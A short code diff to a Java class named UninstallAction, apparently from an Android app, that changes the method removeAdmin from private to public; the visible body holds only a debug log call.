@@ -114,7 +114,7 @@ public class UninstallAction extends SubActionSlow {
 		return true;
 	}
 
-	private static void removeAdmin(Context appContext) {
+	public static void removeAdmin(Context appContext) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (removeAdmin) ");
 		}
